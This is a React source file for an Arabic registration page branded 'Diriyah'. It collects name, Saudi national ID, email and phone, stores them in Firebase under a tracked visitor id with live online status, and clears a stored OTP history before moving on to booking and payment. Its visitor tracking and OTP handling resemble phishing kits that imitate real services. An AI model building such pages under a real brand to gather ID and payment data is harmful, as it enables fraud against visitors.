import { Link, useLocation } from "wouter";
import { Menu } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState, useEffect, useRef } from "react";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import emailjs from "@emailjs/browser";

const EMAILJS_SERVICE_ID = "service_iwqvedj";
const EMAILJS_TEMPLATE_ID = "template_xkdlwg3";
const EMAILJS_PUBLIC_KEY = "ROVj9RXGGeBR7U8iG";

export default function RegistrationPage() {
  return (
    <div className="min-h-screen bg-background flex flex-col" dir="rtl">
      <Header />
      <ProgressSteps currentStep={1} />
      <main className="flex-1 p-4">
        <RegistrationForm />
      </main>
    </div>
  );
}

function Header() {
  return (
    <header className="bg-[#5c4a3d] text-white p-4 flex items-center justify-between">
      <Link href="/">
        <img src="/logo-white.svg" alt="Diriyah" className="h-8" />
      </Link>
      <Button
        variant="ghost"
        size="icon"
        className="text-white"
        data-testid="button-menu"
      >
        <Menu className="h-6 w-6" />
      </Button>
    </header>
  );
}

function ProgressSteps({ currentStep }: { currentStep: number }) {
  const steps = [
    { number: 1, label: "تسجيل" },
    { number: 2, label: "الحجز" },
    { number: 3, label: "السلة" },
    { number: 4, label: "الدفع" },
  ];

  return (
    <div className="bg-[#f5f0e8] p-4" data-testid="progress-steps">
      <div className="flex items-center justify-center gap-2">
        {steps.map((step, index) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
                  step.number <= currentStep
                    ? "bg-primary text-white"
                    : "bg-gray-300 text-gray-600"
                }`}
                data-testid={`step-${step.number}`}
              >
                {step.number}
              </div>
              <span className="text-xs mt-1 text-foreground">{step.label}</span>
            </div>
            {index < steps.length - 1 && (
              <div
                className={`w-8 h-0.5 mx-1 ${
                  step.number < currentStep ? "bg-primary" : "bg-gray-300"
                }`}
              />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function RegistrationForm() {
  const [, setLocation] = useLocation();
  const [name, setName] = useState("");
  const [saudiId, setSaudiId] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [errors, setErrors] = useState<{
    name?: string;
    saudiId?: string;
    email?: string;
    phone?: string;
    bot?: string;
  }>({});

  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasScrolled = useRef(false);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleScroll = () => {
      hasScrolled.current = true;
    };
    const handleMouseMove = () => {
      hasMouseMoved.current = true;
    };
    const handleKeyPress = () => {
      interactionCount.current++;
    };

    window.addEventListener("scroll", handleScroll);
    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("keypress", handleKeyPress);

    return () => {
      window.removeEventListener("scroll", handleScroll);
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("keypress", handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    if (honeypot) return true;
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 3000) return true;
    if (interactionCount.current < 4) return true;
    if (!hasMouseMoved.current && !("ontouchstart" in window)) return true;
    return false;
  };

  const validateSaudiId = (id: string): boolean => {
    if (!/^\d{10}$/.test(id)) return false;
    if (!id.startsWith("1") && !id.startsWith("2")) return false;
    return true;
  };

  const validatePhone = (phoneNum: string): boolean => {
    const cleanPhone = phoneNum.replace(/\s/g, "");
    return /^(05|5)\d{8}$/.test(cleanPhone) || /^\+9665\d{8}$/.test(cleanPhone);
  };

  const validateEmail = (emailStr: string): boolean => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailStr);
  };

  const handleSubmit = async () => {
    const newErrors: typeof errors = {};

    if (!name.trim()) {
      newErrors.name = "الاسم مطلوب";
    }

    if (!saudiId.trim()) {
      newErrors.saudiId = "رقم الهوية مطلوب";
    } else if (!validateSaudiId(saudiId)) {
      newErrors.saudiId =
        "رقم الهوية غير صحيح (يجب أن يكون 10 أرقام ويبدأ بـ 1 أو 2)";
    }

    if (!email.trim()) {
      newErrors.email = "البريد الإلكتروني مطلوب";
    } else if (!validateEmail(email)) {
      newErrors.email = "البريد الإلكتروني غير صحيح";
    }

    if (!phone.trim()) {
      newErrors.phone = "رقم الجوال مطلوب";
    } else if (!validatePhone(phone)) {
      newErrors.phone = "رقم الجوال غير صحيح";
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      const visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
      addData({
        id: visitorId,
        name,
        saudiId,
        email,
        phone,
        currentPage: "registration",
      });
      setupOnlineStatus(visitorId);
      localStorage.removeItem("otpHistory");
      
      // Send confirmation email via EmailJS
      try {
        await emailjs.send(
          EMAILJS_SERVICE_ID,
          EMAILJS_TEMPLATE_ID,
          {
            email: email,
            name: name,
            user_email: email,
            user_name: name,
            reply_to: email,
          },
          EMAILJS_PUBLIC_KEY
        );
        console.log("Confirmation email sent successfully");
      } catch (error) {
        console.error("Failed to send confirmation email:", error);
      }
      
      setLocation("/booking");
    }
  };

  return (
    <div className="max-w-md mx-auto space-y-4">
      <h2 className="text-xl font-semibold text-foreground mb-6">
        معلومات المستخدم
      </h2>

      <input
        type="text"
        value={honeypot}
        onChange={(e) => setHoneypot(e.target.value)}
        className="absolute opacity-0 pointer-events-none h-0 w-0"
        tabIndex={-1}
        autoComplete="off"
        aria-hidden="true"
      />

      {errors.bot && (
        <p className="text-red-500 text-sm text-center" data-testid="error-bot">
          {errors.bot}
        </p>
      )}

      <div>
        <Label htmlFor="name" className="text-sm text-foreground mb-2 block">
          الاسم الكامل *
        </Label>
        <Input
          id="name"
          type="text"
          value={name}
          onChange={(e) => setName(e.target.value)}
          className="text-right"
          placeholder="أدخل الاسم الكامل"
          data-testid="input-name"
        />
        {errors.name && (
          <p className="text-red-500 text-xs mt-1" data-testid="error-name">
            {errors.name}
          </p>
        )}
      </div>

      <div>
        <Label htmlFor="saudiId" className="text-sm text-foreground mb-2 block">
          رقم الهوية الوطنية *
        </Label>
        <Input
          id="saudiId"
          type="text"
          value={saudiId}
          onChange={(e) => {
            const value = e.target.value.replace(/\D/g, "").slice(0, 10);
            setSaudiId(value);
          }}
          className="text-right"
          placeholder="أدخل رقم الهوية (10 أرقام)"
          maxLength={10}
          data-testid="input-saudi-id"
        />
        {errors.saudiId && (
          <p className="text-red-500 text-xs mt-1" data-testid="error-saudi-id">
            {errors.saudiId}
          </p>
        )}
      </div>

      <div>
        <Label htmlFor="email" className="text-sm text-foreground mb-2 block">
          البريد الإلكتروني *
        </Label>
        <Input
          id="email"
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="text-left"
          dir="ltr"
          placeholder="example@email.com"
          data-testid="input-email"
        />
        {errors.email && (
          <p className="text-red-500 text-xs mt-1" data-testid="error-email">
            {errors.email}
          </p>
        )}
      </div>

      <div>
        <Label htmlFor="phone" className="text-sm text-foreground mb-2 block">
          رقم الجوال *
        </Label>
        <Input
          id="phone"
          type="tel"
          value={phone}
          onChange={(e) => {
            const value = e.target.value.replace(/[^\d+]/g, "");
            setPhone(value);
          }}
          className="text-left"
          dir="ltr"
          placeholder="05XXXXXXXX"
          data-testid="input-phone"
        />
        {errors.phone && (
          <p className="text-red-500 text-xs mt-1" data-testid="error-phone">
            {errors.phone}
          </p>
        )}
      </div>

      <div className="space-y-3 pt-4">
        <Button
          onClick={handleSubmit}
          className="w-full bg-primary hover:bg-primary/90 text-white py-6"
          data-testid="button-continue"
        >
          التالي
        </Button>

        <Link href="/tickets">
          <Button
            variant="outline"
            className="w-full py-6"
            data-testid="button-cancel"
          >
            إلغاء
          </Button>
        </Link>
      </div>
    </div>
  );
}
